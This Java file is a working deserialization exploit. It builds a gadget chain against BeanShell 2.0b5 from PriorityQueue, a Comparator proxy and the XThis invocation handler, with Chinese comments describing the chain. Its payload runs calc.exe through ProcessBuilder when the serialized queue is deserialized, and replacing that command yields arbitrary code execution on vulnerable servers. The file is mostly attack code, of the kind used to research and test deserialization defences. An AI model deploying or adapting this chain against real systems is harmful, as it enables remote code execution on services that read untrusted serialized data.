import bsh.Interpreter;
import bsh.XThis;
import util.Util;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;
/*
* 构造链:
* PriorityQueue.readObject
*   Comparator.compare()
*        XThis$Handler.invoke()
                XThis$Handler.invokeImpl()
                    This.invokeMethod()
                        BshMethod.invoke()
* */

/*
* 版本依赖:
* bsh : 2.0b5
* */
public class BeanShell {
    public static void main(String[] args) throws Exception{
        String payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"calc.exe\"}).start();return new Integer(1);}";

        Interpreter interpreter = new Interpreter();
        interpreter.eval(payload);


        XThis xt           = new XThis(interpreter.getNameSpace(), interpreter);
        Field handlerField = XThis.class.getDeclaredField("invocationHandler");
        handlerField.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) handlerField.get(xt);


        Comparator<Object> comparator = (Comparator<Object>) Proxy.newProxyInstance(
                Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);


        PriorityQueue<Object> queue = new PriorityQueue<>(2);
        queue.add("1");
        queue.add("2");

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue, comparator);
        Util.serialize(queue);
        Util.unserialize();
    }
}
